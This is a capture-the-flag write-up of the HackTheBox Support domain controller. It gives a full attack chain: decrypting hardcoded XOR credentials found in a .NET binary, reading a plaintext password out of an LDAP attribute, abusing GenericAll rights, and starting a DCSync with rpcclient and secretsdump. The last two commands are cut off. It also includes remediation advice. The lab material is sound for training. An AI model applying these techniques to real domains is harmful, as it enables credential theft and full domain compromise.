Offensive Security CTF Report
#

Introduction
#

This report documents the penetration testing activities performed against the HackTheBox Support machine. The objective was to conduct a thorough security assessment simulating a real-world internal penetration test, identifying vulnerabilities, exploiting them, and documenting the full attack chain from initial access to complete domain compromise.

The assessment followed industry-standard methodologies including the MITRE ATT&CK framework, PTES (Penetration Testing Execution Standard), and OWASP Testing Guide principles adapted for Active Directory environments.

Objective
#

The objective of this assessment is to perform an internal penetration test against the HackTheBox Support machine (support.htb). The specific goals are:

  • Obtain the user.txt flag (standard user compromise).
  • Obtain the root.txt flag (administrative/root compromise).
  • Document the full attack chain with evidence and remediation recommendations.

Executive Summary
#

The HackTheBox Support machine was fully compromised during this assessment. The machine, acting as an Active Directory Domain Controller for the support.htb domain, contained multiple critical security misconfigurations that allowed for complete domain compromise starting from anonymous access to an SMB share.

High-Level Summary
#

The penetration test revealed a chain of vulnerabilities that progressively escalated privileges from an unauthenticated attacker to Domain Administrator. The attack path leveraged:

  1. Anonymous SMB Access exposing a support tools share containing a .NET binary with hardcoded encrypted credentials.
  2. Weak Cryptography in the UserInfo.exe application using XOR with a static key and salt, allowing trivial decryption of LDAP service credentials.
  3. Sensitive Information Disclosure in Active Directory LDAP attributes, where the info field of the support user contained a plaintext password.
  4. Excessive ACL Permissions where the Shared Support Accounts group had GenericAll permissions over the Domain Controller computer object.
  5. DCsync Attack abusing the excessive permissions to extract all domain password hashes, including the Administrator account.

Recommendations
#

Immediate actions should be taken to remediate the identified vulnerabilities:

  1. Disable anonymous SMB access and implement proper share-level permissions.
  2. Remove hardcoded credentials from all applications; use secure credential storage (Azure Key Vault, HashiCorp Vault, or Windows Credential Manager).
  3. Implement strong encryption (AES-256-GCM) for any data protection requirements.
  4. Audit Active Directory ACLs using BloodHound to identify and remove excessive permissions, particularly GenericAll on high-value targets.
  5. Sanitize LDAP attributes and implement DLP controls to prevent password storage in directory fields.
  6. Enable Protected Users security group and implement tiered administration model.

Vulnerability Analysis
#

Finding 1: Weak Cryptography in UserInfo.exe (Critical)
#

Description
#

The UserInfo.exe binary, distributed via the anonymous support-tools SMB share, implements a custom password decryption routine using XOR encryption with a hardcoded key and static salt value. The algorithm is trivially reversible, exposing LDAP service credentials.

Evidence
#

Decompilation with dnSpy revealed the UserInfo.Services.Protected class:

internal class Protected
{
    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(Protected.enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
        }
        return Encoding.Default.GetString(array2);
    }

    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
}

Parameters extracted:

  • enc_password: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
  • key: armando
  • salt (constant): 223 (0xDF)

Exploitation
#

The XOR cipher was reversed using Python:

import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"
constant = 223

encrypted_bytes = base64.b64decode(enc_password)
password = "".join(
    chr(b ^ ord(key[i % len(key)]) ^ constant)
    for i, b in enumerate(encrypted_bytes)
)
print(f"[+] Password descifrada: {password}")

Result:

[+] Password descifrada: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Credentials recovered:

ldap@support.htb : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Impact
#

An unauthenticated attacker can download the binary, reverse the XOR encryption, and obtain valid LDAP service credentials for the domain. This provides an immediate foothold for directory enumeration.

Remediation
#

  • Never store credentials in client-side code. Use secure credential vaults (Azure Key Vault, AWS Secrets Manager, HashiCorp Vault).
  • Replace XOR/custom encryption with industry-standard algorithms (AES-256-GCM) if encryption is necessary.
  • Remove sensitive binaries from publicly accessible shares.
  • Implement code signing and binary obfuscation only as defense-in-depth, not as primary security control.

\newpage

Finding 2: Plaintext Credentials in LDAP Attributes (High)
#

Description
#

With valid LDAP credentials obtained from the previous finding, directory enumeration revealed that the support user account stored a plaintext password in the info LDAP attribute.

Evidence
#

ldapsearch -H ldap://10.129.230.181 -x \
  -D "ldap@support.htb" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" "(sAMAccountName=support)"

Critical attribute exposed:

info: Ironside47pleasure40Watchful

Credentials recovered:

support@support.htb : Ironside47pleasure40Watchful

Impact
#

Any user with LDAP read access can retrieve passwords stored in directory attributes. This represents a complete bypass of password hashing protections in Active Directory.

Remediation
#

  • Audit all LDAP user attributes (info, description, comment, physicalDeliveryOfficeName) for sensitive data.
  • Implement DLP controls to detect password patterns in directory fields.
  • Enforce attribute-level encryption or restrict read access to sensitive attributes.
  • Educate administrators against using LDAP fields as password storage.

\newpage

Finding 3: Excessive AD Permissions — GenericAll on Domain Controller (Critical)
#

Description
#

The support user account is a member of the Shared Support Accounts group, which has been granted GenericAll (Full Control) permissions over the Domain Controller computer object (DC.SUPPORT.HTB).

Evidence
#

After gaining initial access as support, group membership was verified:

whoami /groups

Relevant memberships:

  • BUILTIN\Remote Management Users
  • SUPPORT\Shared Support Accounts

BloodHound analysis confirmed the dangerous permission:

Graph relationship: Shared Support Accounts -> GenericAll -> DC.SUPPORT.HTB

Impact
#

GenericAll over a Domain Controller computer object allows an attacker to:

  1. Modify the computer account password.
  2. Configure resource-based constrained delegation.
  3. Potentially perform DCSync operations by manipulating replication rights.

In this case, the attacker modified the DC$ account password and used it to perform a DCSync attack.

Remediation
#

  • Remove GenericAll permissions from non-administrative groups on high-value targets (Domain Controllers, Domain Admins, Enterprise Admins).
  • Implement tiered administration model and Administrative Tier 0 separation.
  • Run BloodHound regularly to identify and remediate dangerous permission paths.
  • Enable Privileged Access Workstations (PAWs) for administrative tasks.

DCsync Attack Execution
#

Step 1: Modify the Domain Controller computer account password using the support credentials via RPC:

rpcclient -U "support%Ironside47pleasure40Watchful" 10.129.230.181 \

Technical Note: The information level 24 corresponds to USER_PASSWORD_INFORMATION, allowing the password to be set directly on the computer account.

Step 2: Extract all domain hashes using DCSync with the compromised computer account:

impacket-secretsdump -dc-ip 10.129.230.181 \
